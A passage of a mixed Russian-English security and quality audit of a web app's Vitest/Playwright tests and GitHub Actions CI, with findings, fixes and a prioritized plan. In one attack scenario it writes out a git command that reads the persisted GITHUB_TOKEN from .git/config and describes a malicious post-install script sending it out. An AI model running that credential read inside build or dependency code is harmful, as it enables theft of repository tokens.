1. Failing unit/e2e-тест залогирует API-key в error message (например, mocked fetch failure echoes request headers, или Vitest `console.error(req)` в failing assertion).
2. Этот ключ публикуется как public annotation на run.
3. `retries: 1` re-run'ит failing tests → ключ появляется дважды и индексируется GitHub search.

**Impact:**
- Public утечка секретов через GitHub annotations.
- Особенно опасно для fork-PRs — annotations видны без login.

**Фикс:**
1. Gate these steps behind `if: github.event.pull_request.head.repo.full_name == github.repository` (skip на forks).
2. Pipe tail через secret-scan filter (trufflehog, regex-replace для common token shapes) перед emit'ом annotation.

---

## CI-H-3. `actions/checkout@v4` использует default `persist-credentials: true` в 8 jobs

**Файл:** `.github/workflows/ci.yml:26, 70, 120, 163, 209, 240, 270, 318`

**Описание:**
Все 8 `actions/checkout@v4` invocations — с default'ами. `persist-credentials: true` пишет `GITHUB_TOKEN` в `.git/config` checked-out repo. Любой последующий step (включая `npm ci` post-install scripts, vitest plugins, eslint rules, dep-cruiser, madge) может его прочитать: `git config --get http.https://github.com/.extraheader`.

**Сценарий атаки:**
1. Compromised dependency (typosquat `lucide-react` → `lucid-react`, malicious post-install в `esbuild` 0.28.1's transitive tree).
2. Post-install script читает `GITHUB_TOKEN` из `.git/config`.
3. Exfiltrate через HTTPS-request → атакующий имеет `contents: read` access к repo.
4. Если repo private → атакующий может читать private code. Может читать PR secrets.

Jobs с наибольшим untrusted-code exposure: `test`, `coverage`, `e2e` (vitest + jsdom + fake-indexeddb + Playwright).

**Фикс:**
```yaml
- uses: actions/checkout@v4
  with:
      persist-credentials: false
```
На все 8 checkout-степов. Если будущий step должен push'ить — scope отдельный PAT на этот step.

---

## CI-H-4. Bundle-size gate — advisory-only, и bundle уже превышает threshold

**Файлы:**
- `.github/workflows/ci.yml:95-101` (gate)
- `e2e/playwright.config.ts:11` (comment: "38MB bundle")

**Описание:**
```yaml
- name: Check bundle size
  run: |
      TOTAL_SIZE=$(du -sb dist/ | cut -f1)
      echo "Total dist size: $((TOTAL_SIZE / 1024 / 1024)) MB"
      if [ "$TOTAL_SIZE" -gt $((30 * 1024 * 1024)) ]; then
        echo "::warning title=Bundle Size::Total dist size exceeds 30 MB (...)"
      fi
```

Только `::warning`, не `::error` + `exit 1`. Comment в `playwright.config.ts:11`: *«Cold boot (38MB bundle + Dexie migrations)»* — production bundle уже ~38 MB, на 27% превышает threshold. CI зелёный.

**Impact:**
- Zero regression protection: 60 MB bundle тоже пройдёт.
- Warning fatigue: maintainer'ы перестанут замечать, когда bundle прыгнет с 38 MB на 80 MB.
- 38 MB baseline feeds back в CI-H-1 (cold-boot timeouts).

**Фикс:**
```yaml
if [ "$TOTAL_SIZE" -gt $((42 * 1024 * 1024)) ]; then
    echo "::error title=Bundle Size::Total dist size exceeds 42 MB (...)"
    exit 1
fi
```
Threshold = current size + 10% headroom (42 MB). С day-one enforcement.

---

# ЧАСТЬ 5. MEDIUM баги в тестах и CI

## T-M-1. `WorkerMock` всегда возвращает hardcoded result → masks worker-consumer bugs

**Файл:** `src/tests/setup-light.ts:5-21`

**Описание:**
```ts
class WorkerMock {
    postMessage(_msg: unknown) {
        setTimeout(() => {
            if (this.onmessage) {
                this.onmessage({ data: { result: 'Mocked Worker Result' } } as MessageEvent);
            }
        }, 0);
    }
}
```

Всегда возвращает `{ result: 'Mocked Worker Result' }`, независимо от input. Никогда не шлёт `type: 'cap_request'`, `error`, или любой realistic message-shape. `src/kernel/services/sandbox-service.ts:154-215` handles `cap_request`, `error`, `result` — но mock ни одного из них не emit'ит (только `result`).

Сегодня moot (sandbox-service не имеет теста), но moment кто-то добавит `sandbox-service.test.ts` — global `WorkerMock` молча swallow'нет его.

`grep` для `'Mocked Worker Result'` → 0 matches → mock невидим.

**Фикс:**
1. Make `WorkerMock` configurable per-test: `vi.stubGlobal('Worker', makeWorkerMock(handler))` где `handler` может emit'ить `cap_request`.
2. **Или** в `sandbox-service.test.ts` override'нуть global mock с real `Worker`, загружающим `sandbox.worker.ts`.

---

## T-M-2. `setup-runtime.ts` — НЕ глобальный setupFile, импортируется per-file

**Файлы:**
- `vitest.config.ts:10` (`setupFiles: ['./src/tests/setup-light.ts']`)
- `src/tests/setup-runtime.ts:1-8`

**Описание:**
`setup-runtime.ts` делает `await runtime.start()` на top-level — но load'ится только когда test-file делает `import '../../tests/setup-runtime'`. 24 таких файла, все в `src/kernel/service-registration/` и `src/kernel/integration.test.ts`.

**Ни один из них не в `test:stable`** (см. T-C-2) → никогда не запускаются в CI.

Если non-runtime test случайно зависит от runtime state → получает только то, что даёт `setup-light.ts` (jsdom + fake-indexeddb + WorkerMock).

**Impact:**
- Tests, нуждающиеся в DI container, либо молча crash'ат в CI (not run), либо fail с cryptic "service not registered".
- Boundary между "needs runtime" и "doesn't" — implicit, не enforced.

**Фикс:**
1. Добавить `setup-runtime.ts` в `setupFiles` (no-op, если уже started).
2. **Или** eslint-rule, флагающий `import.*setup-runtime` вне known allowlist.

---

## T-M-3. Assertion-less `it()` blocks (6 найдено)

**Файлы:**
- `src/components/ConnectorsPanel/ConnectorsPanel.test.tsx:130` — truly empty body
- `src/kernel/services/debate-runtime/debate-orchestrator.test.ts:184, 192, 201` — rely on throw-propagation as implicit assertion (comment "Should not throw" но no `expect`)

**Описание:**
`ConnectorsPanel.test.tsx:130` (`has role="alert" on error message`) renders panel и asserts nothing — comment: *«no error by default»*. 3 `debate-orchestrator` tests call `orch.abort()`/`destroy()` и verify только что no exception propagates.

**Impact:**
- Тесты проходят, даже если function делает nothing.
- ConnectorsPanel test даёт zero value.

**Фикс:**
- Delete these tests.
- **Или** add real assertions: `expect(orch['aborted'].has('session-1')).toBe(true)`.

---

## T-M-4. 75 тестов с weak matchers (`toBeTruthy`/`toBeDefined`/`toBeNull`)

**Файлы:**
- `src/components/panel-smoke-tests.test.tsx:124, 133, 142, 151, 160, 169` — 6 panels asserting only `expect(document.body).toBeTruthy()`
- 30+ UI tests с only `expect(container).toBeDefined()` (*"renders without crashing"*)

**Описание:**
- `expect(document.body).toBeTruthy()` — проходит даже если panel rendered nothing (`document.body` всегда truthy в jsdom).
- `expect(container).toBeDefined()` — проходит для empty `<div />`.

**Impact:**
- Smoke tests дают false confidence — panel, throw'ящий во время render, но обёрнутый в error boundary (или returning `null`), всё ещё "passes".

**Фикс:**
```ts
expect(container.firstChild).not.toBeNull();
// или
expect(container.textContent.length).toBeGreaterThan(0);
```

---

## T-M-5. `.resolves.toBeDefined()` / `.resolves.not.toThrow()` — silent pass on garbage returns

**Файлы:**
- `src/kernel/services/debate-runtime/got-deliberation.test.ts:21`
- `src/kernel/services/debate-runtime/debate-adversarial-source-service.test.ts:17`
- `src/kernel/services/chat-bookmarks-service.test.ts:71, 167`

**Описание:**
```ts
await expect(svc.deliberate('', '', [])).resolves.toBeDefined();
await expect(...).resolves.not.toThrow();
```

- `.resolves.toBeDefined()` проходит для любого non-undefined return — включая `{ error: '...' }`, empty array, mis-typed object.
- `.resolves.not.toThrow()` проходит для любого resolved promise, даже resolving to `null`.

**Impact:**
- Bug, возвращающий wrong-but-defined object (например `{ ok: false }` вместо `{ ok: true, verdict: ... }`), ship'ит green.

**Фикс:**
Assert против actual return shape:
```ts
expect(res.verdict).toBeDefined();
// или
expect(res.ok).toBe(true);
```

---

## T-M-6. `testTimeout: 15000` (15s) — слишком щедро; `teardownTimeout: 30000` — flaky worker teardown

**Файл:** `vitest.config.ts:12-16`

**Описание:**
- 15s per unit test — 3-5x typical.
- Comment (lines 14-15): *«Heavy store tests under v8 coverage can need longer worker teardown on shared GH runners ('Timeout terminating forks worker')»*.
- 30s teardown timeout означает, что workers hang на cleanup — симптом un-awaited promises или open handles в store tests.

**Impact:**
- Slow CI.
- Masks hanging tests.
- Signals real isolation problem в store tests.

**Фикс:**
1. Profile какие tests trigger'ят teardown timeout (`vitest --reporter=verbose`).
2. Найти un-awaited promise.
3. Drop `teardownTimeout` обратно к default 10s.

---

## T-M-7. Playwright `retries: 1` masks flaky e2e tests

**Файл:** `e2e/playwright.config.ts:14`

**Описание:**
`retries: 1` → каждый failing e2e test получает один retry. Если проходит на retry → CI зелёный. `boot()` gate (`e2e/helpers.ts:13-22`) уже имеет 120s timeout per attempt → с retries это 240s per test. Combined с `timeout: 180000` (line 13) и per-describe `timeout: 300000` overrides → single flaky test может burn 5+ минут.

**Impact:**
- Flaky tests никогда не fix'ятся, потому что проходят на retry.
- Real regressions маскируются retry luck.

**Фикс:**
```ts
retries: process.env.CI ? 0 : 1,
```
Inverse от того, что хочется. **Или** track flake rate через Playwright reporter.

---

## T-M-8. `npm run lint -- --max-warnings 5200` — pin к текущему count, new warnings slip in

**Файл:** `.github/workflows/ci.yml:59` + comment lines 53-58

**Описание:**
Threshold pinned at 5200 (current count). Если PR reduces warnings до 4000 → следующий PR может добавить 1100 new warnings и всё равно пройти. Comment: *«Re-tighten as warnings are fixed»* — но нет automation для этого.

**Impact:**
- Lint debt растёт монотонно, пока кто-то вручную не re-tighten'ёт.
- New code-quality issues accumulate silently.

**Фикс:**
```bash
# Для новых файлов — strict:
eslint --max-warnings 0 $(git diff --name-only --cached --diff-filter=d | grep -E '\.(ts|tsx)$')
# Для legacy — 5200 floor:
eslint --max-warnings 5200 src/
```

---

## CI-M-1. `::notice` message length превышает GitHub's 4096-char annotation cap

**Файлы:**
- `.github/workflows/ci.yml:153, 200` (`.slice(-6000)`)
- `e2e/dump-console.mjs:15` (`.slice(0, 4000)`)

**Описание:**
`node -e` tail-scripts используют `.slice(-6000)` (lines 153, 200) перед escaping. `e2e/dump-console.mjs:15` использует `.slice(0, 4000)`. GitHub truncates annotation message bodies на 4096 chars; overflow silently dropped, не failed.

**Impact:**
- Последние 6000 chars test output читаются, но только первые ~4096 попадают в visible annotation.
- Slice с конца (`-6000`), но annotation reads head-first → **самые relevant lines** (actual assertion failure, обычно в конце tail) — те, что truncate'нутся.
- Maintainer'ы видят head of tail, не failure line.

**Фикс:**
```js
.slice(-4000)  // или 3800 для headroom под title
```

---

## CI-M-2. Playwright browser cache HIT skip'ает OS-package reinstall — fragile против runner-image updates

**Файл:** `.github/workflows/ci.yml:337-346`

**Описание:**
```yaml
- name: Cache Playwright browsers
  uses: actions/cache@v4
  with:
      path: ~/.cache/ms-playwright
      key: playwright-${{ runner.os }}-${{ hashFiles('package-lock.json') }}

- name: Install Playwright browsers
  if: steps.playwright-cache.outputs.cache-hit != 'true'
  run: npx playwright install --with-deps chromium
```

Cache stores только `~/.cache/ms-playwright` (browser binaries). `if:` guard → `--with-deps` (Ubuntu packages: libnss3, libatk1.0, etc.) устанавливаются **только на cache miss**. OS-packages не cached.

**Сценарий:**
1. GitHub bumps `ubuntu-latest` на newer image, drop'ает lib, который нужен старому Playwright binary.
2. Cached browser binary fail'ит с `Host system is missing dependencies`.
3. CI reports как test failure, а не dependency issue.
4. Cache выглядит healthy → fix non-obvious.

Это **уже случалось** multiple times (libglib2.0-0 removed/re-added across 22.04→24.04 transitions).

**Фикс:**
1. Drop `if:` guard — всегда run `npx playwright install --with-deps chromium` (idempotent, ~10s on cache hit).
2. **Или** key cache на `hashFiles('package-lock.json')-${{ runner.image }}` → image bumps invalidate.

---

## CI-M-3. `actions: read` permission на `build` и `e2e` — unused

**Файл:** `.github/workflows/ci.yml:68, 316`

**Описание:**
`build` и `e2e` jobs declare `actions: read` в дополнение к `contents: read`. `actions/download-artifact@v4` (used в `e2e` на line 351) **не** требует `actions: read`, когда скачивает artifacts из того же workflow run — implicit `GITHUB_TOKEN` достаточен. `build` job вообще не использует `download-artifact`.

**Impact:**
- Over-scoped permissions. Если step в любом из jobs compromised → атакующий может читать workflow run metadata (logs of prior runs, включая failed `::notice` annotations из других workflows), что не должен мочь с одним `contents: read`.

**Фикс:**
Drop `actions: read` из обоих jobs (lines 68 и 316). Re-add только если будущий step нуждается в download из другого workflow run.

---

# ЧАСТЬ 6. LOW баги в тестах и CI

## T-L-1. Hardcoded test port `3001` collides с default `SYNC_PORT`

**Файлы:**
- `src/kernel/services/interop/mcp-harness-service.test.ts:10` (`url: 'http://localhost:3001'`)
- `server/sync-server.mjs:46` (`SYNC_PORT || '3001'`)
- `scripts/cors-proxy.mjs:7` (`PORT = 3002`)

**Описание:**
MCP harness test hardcoded'ит `localhost:3001` как dummy URL. Если test когда-нибудь сделает real fetch (сегодня не делает — URL просто stored в config object) → hit'нет real sync-server, если он запущен локально.

**Фикс:**
Использовать reserved test port (`9999`) или `http://example.test` (RFC 6761 reserved).

---

## T-L-2. `uiPreferencesStore.test.ts` — второй describe без `beforeEach`

**Файл:** `src/stores/uiPreferencesStore.test.ts:141-159`

**Описание:**
Первый `describe` (line 6) имеет `beforeEach`, clear'ящий localStorage и reset'ящий state. Второй `describe` "useUiPreferences migration" (line 141) — **не имеет**. Sets localStorage на line 143, calls `vi.resetModules()` на line 150, re-imports store, затем `localStorage.clear()` только на line 157 (внутри test).

Если этот test throw'нет между lines 143 и 157 → seeded localStorage persist'ит в следующий test file. Vitest default: один jsdom per test file → cross-file leak unlikely, но future config change может break это предположение.

**Фикс:**
```ts
afterEach(() => localStorage.clear());
```
в migration describe block.

---

## CI-L-1. `npm audit` omits `--omit=dev`, runs every CI cycle без result caching

**Файл:** `.github/workflows/ci.yml:224-230`

**Описание:**
`npm audit --audit-level=critical` (line 230) сканирует и prod, и dev dependencies. Для client-only SPA dev-dep CVEs (vitest, undici, jsdom, esbuild) не ship'ят к users, **но** execute на CI runners, где живут секреты.

**Impact:**
1. Critical CVE в dev dep (например, future vitest RCE) заблокирует все PRs, хотя prod unaffected — coupling dev-tooling hygiene к ship velocity.
2. Advisory fetch повторяется на каждом run (~5-10s overhead).

**Фикс:**
```yaml
- run: npm audit --omit=dev --audit-level=critical
- run: npm audit --audit-level=high
  continue-on-error: true  # advisory для dev-dep hygiene
```

---

## CI-L-2. `dist` artifact retention = 7 days — слишком коротко для post-prod-bug forensics

**Файл:** `.github/workflows/ci.yml:110, 365`

**Описание:**
Оба `actions/upload-artifact@v4` invocations — `retention-days: 7`. `dist` artifact (line 110) — exact bundle, который ship'нул на Pages. `playwright-report-${{ matrix.name }}` artifacts (line 365) — failure diagnostics.

**Impact:**
- Regression, reported в prod больше чем через 7 дней после deploy (очень часто для low-traffic routes) — нельзя diff'нуть против shipped bundle.
- Maintainer'ы должны rebuild из `git sha`, что может не воспроизвести, если Vite/rollup versions drifted.
- Playwright failure artifacts от flaky run на прошлой неделе — тоже gone.

**Фикс:**
- `dist`: bump `retention-days` до 30 (small artifact — один Vite build).
- Playwright reports: 14 дней.
- **Или** pin `retention-days` выше только на `main`/`master` runs: `${{ github.ref == 'refs/heads/main' && 30 || 7 }}`.

---

## CI-L-3. Dependabot blanket-игнорит `zod` и `typescript`

**Файл:** `.github/dependabot.yml:14-17`

**Описание:**
```yaml
ignore:
    - dependency-name: react-router
    - dependency-name: react-router-dom
    - dependency-name: zod
    - dependency-name: typescript
```

`react-router`/`react-router-dom` — оправдано (unpatched CVE). `zod` и `typescript` — **не** оправдано ничем, выглядит как convenience-ignore против breaking-change PRs.

**Impact:**
- Future high-severity zod-CVE (zod используется для всей input-валидации в приложении) не создаст Dependabot-PR → silent skip.
- TypeScript security patches тоже skip'аются.

**Фикс:**
Удалить `zod` и `typescript` из `ignore`. Использовать `@vX` range-constraints в `package.json` для контроля breaking-changes.

---

## CI-L-4. Third-party actions pinned к major version, не к SHA

**Файл:** `.github/workflows/ci.yml:26, 29, 35, 70, 79, 106, 120, 163, 209, 351, 361, 395, 425, 431`

**Описание:**
Все actions (`actions/checkout@v4`, `actions/setup-node@v4`, `actions/cache@v4`, `actions/upload-artifact@v4`, `actions/download-artifact@v4`, `actions/upload-pages-artifact@v3`, `actions/deploy-pages@v4`) — pinned к `@v4`/`@v3` floating tags. GitHub может repoint'нуть эти tags.

**Impact:**
- Если `actions/checkout`'s `v4` tag когда-нибудь compromised (случалось с другими экосистемами) → malicious checkout step runs с `contents: read` permissions и может exfiltrate repo или insert backdoors через cache poisoning.

**Фикс:**
Pin каждый action к `@<commit-sha>` + Renovate/Dependabot config для bump SHA в PRs.

---

# ЧАСТЬ 7. Не-bugs (верифицировано безопасным)

| Элемент | Проверка | Вердикт |
|---|---|---|
| `.github/workflows/ci.yml:7-11` YAML syntax `branches: [main, master]` | Корректный YAML — `[main, master]` (hex verified). `ain, master]` — display-artifact (ANSI `[m` reset SGR consumed by PTY) | НЕ bug |
| `set -o pipefail` + `tee` в test-step | С `pipefail`, `npm run test:stable` exit non-zero → pipeline exit non-zero. `tee` только mirrors output. | НЕ bug |
| `node -e "..."` "Publish test tail on failure" step | Single-quoted JS strings, no `$`/backticks/`\` shell-evaluable. Output consumed by GitHub annotation parser, не re-executed. | Safe от shell injection (но см. CI-H-2 про secret leak) |
| `actions/upload-pages-artifact@v3` | v3 — latest major для этого action. v4 не существует. `actions/deploy-pages@v4` — current major. | НЕ bug |
| `id-token: write` scope | Scoped только к `deploy` job (lines 386-389). Все другие jobs — `contents: read` only. | Least-privilege correct |
| `node_modules` cache key на `package-lock.json` only | `npm ci` treat'ит `package-lock.json` как source of truth и **fails** если `package.json` out of sync. Cache key минимальный и корректный. | НЕ bug |
| `dist/**/*.map` glob (CI-C-2 — это bug, но не из-за globstar syntax) | Если бы `shopt -s globstar` был включён, `**` работал бы. Без globstar `**` = `*`. | Bug (см. CI-C-2) |
| `persist-credentials` default on checkout | (CI-H-3 — это bug) | Bug |
| `deploy if: github.ref == 'refs/heads/main' \|\| 'refs/heads/master'` | Trigger filter `branches: [main, master]` — correct. Deploy `if` — correct. | НЕ bug |
| Coverage `exclude: ['src/**/*.test.*', 'src/**/*.d.ts', 'src/types/**']` | Стандартный exclude — test files не нужно покрывать coverage'ом. | НЕ bug |
| `src/kernel/security.test.ts` — 4 passing tests (round-trip, >100KB, changePassword, restore-on-fail) | Хорошее покрытие для `SecurityService`. | НЕ bug (но coverage scope excludes security.test.ts — см. T-C-1) |

---

# ЧАСТЬ 8. Приоритезированный план исправлений

## P0 — критично, фиксить немедленно

1. **T-C-1**: Расширить `vitest.config.ts:coverage.include` на `src/kernel/services/**` + `src/llm/**` с per-directory thresholds.
2. **T-C-2**: Добавить security-critical test paths в `test:stable` (начать с `network.test.ts`, `notification-webhook-service.test.ts`, `external-secrets-service.test.ts`, `prompt-security-service.test.ts`).
3. **T-C-3**: Добавить `expect(fallback.sendMessage.mock.calls[0][2]).toBe('sk-anthropic')` в `fallback-decorator.test.ts:60-71` + рефакторинг декоратора на `keyResolver`.
4. **T-C-4**: Создать `key-vault.test.ts` покрывающим encrypt/decrypt/lock/sentinel handling.
5. **T-C-5**: Создать `n8n-service.test.ts` покрывающим SSRF/URL-injection/path-traversal.
6. **T-C-6**: Заменить `httpGuard` на `isPrivateIP` + создать `tool-runner-service.test.ts`.
7. **CI-C-1**: Добавить `checkout` + `setup-node` + `npm ci` в deploy job (или перенести sourcemap-upload в build).
8. **CI-C-2**: Заменить `rm -f dist/**/*.map dist/*.map` на `find dist -type f -name '*.map' -delete`.
9. **CI-C-3**: Добавить `deploy` concurrency group с `cancel-in-progress: false`.

## P1 — высоко, фиксить в следующем спринте

10. **T-H-1**: Создать `server/company-store.test.mjs` для `decideApproval` atomicity.
11. **T-H-2**: Создать `server/sync-server.test.mjs` для `writeQueue` recovery + WS auth.
12. **T-H-3**: Добавить stats-preservation assertion в `useKeyStore.test.ts:190-209`.
13. **T-H-4**: Добавить `streamPost` тесты в `llm-http-client.test.ts`.
14. **T-H-5**: Создать `scripts/cors-proxy.test.mjs` для `normalizeIP`/`isPrivateIP`.
15. **T-H-6**: Покрыть `Sec-WebSocket-Protocol` auth тестами в `sync-server.test.mjs`.
16. **T-H-7**: Добавить e2e specs для sandbox, sync, fallback, SSRF.
17. **T-H-8**: Pin affected deps + re-enable `--audit-level=high`.
18. **CI-H-1**: Rebalance e2e matrix (два 300s specs в `health-chat`) или поднять `timeout-minutes` до 60.
19. **CI-H-2**: Gate annotation-publishing steps на non-fork PRs + secret-scan filter.
20. **CI-H-3**: `persist-credentials: false` на все 8 checkout steps.
21. **CI-H-4**: Конвертировать bundle-size в hard gate с threshold 42 MB.

## P2 — средне, плановый рефакторинг

22. **T-M-1**: Configurable `WorkerMock` или override в sandbox-service.test.ts.
23. **T-M-2**: `setup-runtime.ts` в `setupFiles` ИЛИ eslint-rule.
24. **T-M-3, T-M-4, T-M-5**: Fix assertion-less / weak-matcher / `.resolves.toBeDefined()` tests.
25. **T-M-6**: Profile teardown timeout, find un-awaited promises.
26. **T-M-7**: `retries: process.env.CI ? 0 : 1` в playwright.config.ts.
27. **T-M-8**: Lint — strict для новых файлов, 5200 floor для legacy.
28. **CI-M-1**: `.slice(-4000)` вместо `.slice(-6000)`.
29. **CI-M-2**: Drop `if:` guard на Playwright browser install ИЛИ key на `${{ runner.image }}`.
30. **CI-M-3**: Drop `actions: read` из `build` и `e2e` jobs.

## P3 — низко

31. **T-L-1**: Reserved test port вместо `3001`.
32. **T-L-2**: `afterEach(() => localStorage.clear())` в `uiPreferencesStore.test.ts` migration describe.
33. **CI-L-1**: `npm audit --omit=dev` для prod gate, advisory для dev-dep.
34. **CI-L-2**: `retention-days: 30` для `dist`, 14 для Playwright reports.
35. **CI-L-3**: Убрать `zod` и `typescript` из `dependabot.yml:ignore`.
36. **CI-L-4**: SHA-pin все GitHub Actions.

---

# Приложение A. Файлы с подтверждёнными багами

| Файл | Баги |
|---|---|
| `vitest.config.ts` | T-C-1, T-M-6 |
| `package.json` (test:stable script) | T-C-2 |
| `src/llm/decorators/fallback-decorator.test.ts` | T-C-3 |
| `src/kernel/services/key-management/key-vault.ts` | T-C-4 (no test exists) |
| `src/kernel/services/n8n-service.ts` | T-C-5 (no test exists) |
| `src/kernel/services/parity/tool-runner-service.ts` | T-C-6 (no test exists) |
| `server/company-store.mjs` | T-H-1 (no test exists) |
| `server/sync-server.mjs` | T-H-2, T-H-6 (no test exists) |
| `src/stores/useKeyStore.test.ts` | T-H-3 |
| `src/llm/http/llm-http-client.test.ts` | T-H-4 |
| `scripts/cors-proxy.mjs` | T-H-5 (no test exists) |
| `e2e/*.spec.ts` | T-H-7 |
| `src/tests/setup-light.ts` | T-M-1 |
| `src/tests/setup-runtime.ts` | T-M-2 |
| `src/components/ConnectorsPanel/ConnectorsPanel.test.tsx` | T-M-3 |
| `src/kernel/services/debate-runtime/debate-orchestrator.test.ts` | T-M-3 |
| `src/components/panel-smoke-tests.test.tsx` | T-M-4 |
| `src/kernel/services/debate-runtime/*.test.ts` | T-M-5 |
| `src/kernel/services/chat-bookmarks-service.test.ts` | T-M-5 |
| `e2e/playwright.config.ts` | T-M-7 |
| `src/kernel/services/interop/mcp-harness-service.test.ts` | T-L-1 |
| `src/stores/uiPreferencesStore.test.ts` | T-L-2 |
| `.github/workflows/ci.yml` | T-H-8, CI-C-1, CI-C-2, CI-C-3, CI-H-1, CI-H-2, CI-H-3, CI-H-4, CI-M-1, CI-M-2, CI-M-3, CI-L-1, CI-L-2, CI-L-4 |
| `.github/dependabot.yml` | CI-L-3 |

---

# Приложение B. Сводка по направлениям проверок

| # | Направление | Багов | Главные находки |
|---|---|---|---|
| 1 | Unit test coverage scope | 1 critical | T-C-1: 90% кода вне coverage-gate |
| 2 | test:stable script | 1 critical | T-C-2: 200 test-файлов вне CI |
| 3 | Security-critical code tests | 4 critical | T-C-3, T-C-4, T-C-5, T-C-6 |
| 4 | Race conditions tests | 2 high | T-H-1, T-H-2 |
| 5 | Async/streaming tests | 1 high | T-H-4 (streamPost) |
| 6 | SSRF protection tests | 2 high | T-H-5 (cors-proxy), T-C-6 (httpGuard) |
| 7 | WebSocket auth tests | 1 high | T-H-6 |
| 8 | E2E security flows | 1 high | T-H-7 |
| 9 | Dependency CVEs в CI | 1 high | T-H-8 (7 hidden HIGH CVEs) |
| 10 | CI deploy job | 1 critical, 1 high | CI-C-1 (no checkout), CI-C-2 (globstar) |
| 11 | CI concurrency | 1 critical | CI-C-3 (cancel mid-deploy) |
| 12 | CI e2e matrix balance | 1 high | CI-H-1 (40-min timeout) |
| 13 | CI annotation publishing | 1 high, 1 medium | CI-H-2 (secret leak), CI-M-1 (4096 cap) |
| 14 | CI checkout credentials | 1 high | CI-H-3 (persist-credentials) |
| 15 | CI bundle size gate | 1 high | CI-H-4 (advisory-only) |
| 16 | Test mocks | 1 medium | T-M-1 (WorkerMock) |
| 17 | Test setup files | 1 medium | T-M-2 (setup-runtime) |
| 18 | Assertion-less tests | 1 medium | T-M-3 |
| 19 | Weak matchers | 1 medium | T-M-4 (75 tests) |
| 20 | Async test smells | 1 medium | T-M-5 |
| 21 | Test timeouts | 1 medium | T-M-6 |
| 22 | Playwright retries | 1 medium | T-M-7 |
| 23 | Lint threshold | 1 medium | T-M-8 |
| 24 | Playwright cache | 1 medium | CI-M-2 |
| 25 | Permissions scope | 1 medium | CI-M-3 |
| 26 | Test isolation | 1 low | T-L-2 |
| 27 | Hardcoded values | 1 low | T-L-1 |
| 28 | npm audit scope | 1 low | CI-L-1 |
| 29 | Artifact retention | 1 low | CI-L-2 |
| 30 | Dependabot ignores | 1 low | CI-L-3 |
| 31 | Actions pinning | 1 low | CI-L-4 |

---

# Приложение C. Методология

Аудит выполнен как:
- **Прямое чтение** CI-конфигурации: `.github/workflows/ci.yml`, `.github/dependabot.yml`, `vitest.config.ts`, `e2e/playwright.config.ts`, `src/tests/setup-light.ts`, `src/tests/setup-runtime.ts`.
- **Grep-поиск** по 380 test-файлам: `test.skip`, `it.skip`, `describe.skip`, `xit`, `xdescribe`, `xtest`, `test.only`, `it.only`, `.resolves.toBeDefined`, `.resolves.not.toThrow`, `toBeTruthy`, `toBeDefined`.
- **Cross-reference** с основным аудитом (`CRITICAL_BUGS_AUDIT.md`) — каждый production-баг проверен на наличие regression-test.
- **Параллельные суб-аудиты**: test-suite-quality + CI/CD-pipeline-security.
- **Локальный `npm audit --audit-level=high`** для верификации скрытых HIGH CVEs.

Ограничения:
- Не запускался `vitest run` (только static analysis).
- Не проверялось, какие из 257 pre-existing failures в 67 files — security-релевантные.
- Не проводился mutation testing для оценки quality существующих assertions.

---

**Конец отчёта.**

**Всего найдено: 6 CRITICAL, 11 HIGH, 8 MEDIUM, 6 LOW = 31 подтверждённый баг** в тестах и CI.

**Топ-3 действия (наибольший leverage):**
1. Добавить security-critical test paths в `test:stable` (T-C-2) — эти тесты уже существуют и проходят; их просто не запускают в CI.
2. Заменить `httpGuard` в `tool-runner-service.ts:84-106` на `import { isPrivateIP } from '../../utils/network'` (T-C-6) — устраняет дюжину SSRF bypass'ов, переиспользуя уже тестируемую реализацию.
3. Re-enable `npm audit --audit-level=high` после pin'а `@tiptap/core`, `fast-uri`, `undici`, `js-yaml`, `brace-expansion`, `browserslist`, `nanoid` (T-H-8) — закрывает 7 скрытых HIGH CVEs.
